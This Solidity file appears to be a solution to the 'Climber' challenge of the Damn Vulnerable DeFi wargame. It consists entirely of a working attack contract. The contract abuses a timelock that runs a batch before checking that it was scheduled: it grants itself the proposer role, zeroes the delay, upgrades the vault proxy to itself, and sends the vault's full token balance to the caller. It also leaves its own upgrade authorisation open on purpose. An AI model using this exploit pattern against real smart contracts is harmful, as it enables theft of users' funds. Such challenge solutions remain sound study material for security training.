// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./ClimberTimelock.sol";

/**
 * @title ClimberVault
 * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberAttack is UUPSUpgradeable {
    /// @custom:oz-upgrades-unsafe-allow constructor

    bytes32 private proposer_role = keccak256("PROPOSER_ROLE");

    address public timeLockAddress;

    uint256[] private values = new uint256[](5);

    bytes[] private datas = new bytes[](5);

    address[] private targetsAttacked = new address[](5);

    constructor(address _timelockAddress) {
        timeLockAddress = _timelockAddress;
    }

    function initialize() external initializer {}

    // Send money to attacker
    function withdraw(address token, address attacker) external {
        IERC20(token).transfer(
            attacker,
            IERC20(token).balanceOf(address(this))
        );
    }

    function schedule() external {
        ClimberTimelock(payable(timeLockAddress)).schedule(
            targetsAttacked,
            values,
            datas,
            0
        );
    }

    function attack(
        address climberLockAddress,
        address tokenAddress,
        address[] calldata targets
    ) external {
        // step by step :
        // 1. grantRole(PROPOSER_ROLE,address(this)) => at timelock
        // 2. updateDelay(0) => at timelock
        // 3. proxy.upgradeTo(address newImplementation) => at climbervault proxy
        // 4. proxy.withdraw(token,attacker) => at climbervault proxy
        // 5. schedule() => at this contract

        // first call data is setup grantRole
        for (uint i = 0; i < targetsAttacked.length; i++) {
            targetsAttacked[i] = targets[i];
        }

        bytes memory data1 = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            proposer_role,
            address(this)
        );
        datas[0] = data1;

        // then updateDelay to zero
        bytes memory data2 = abi.encodeWithSignature("updateDelay(uint64)", 0);
        datas[1] = data2;

        bytes memory data3 = abi.encodeWithSignature(
            "upgradeTo(address)",
            address(this)
        );
        datas[2] = data3;

        //transfer
        bytes memory data4 = abi.encodeWithSignature(
            "withdraw(address,address)",
            tokenAddress,
            msg.sender
        );
        datas[3] = data4;

        //schedule
        bytes memory data5 = abi.encodeWithSignature("schedule()");

        datas[4] = data5;

        // // schedule() to pass the require
        // _datas[4] = abi.encodeWithSignature(
        //     "schedule(address[],uint256[],bytes[],bytes32)",
        //     targets,
        //     _values,
        //     _datas,
        //     0
        // );

        ClimberTimelock(payable(climberLockAddress)).execute(
            targetsAttacked,
            values,
            datas,
            0
        );
    }

    // you can lock it for upgrade by adding onlyOwner
    function _authorizeUpgrade(address newImplementation) internal override {}
}
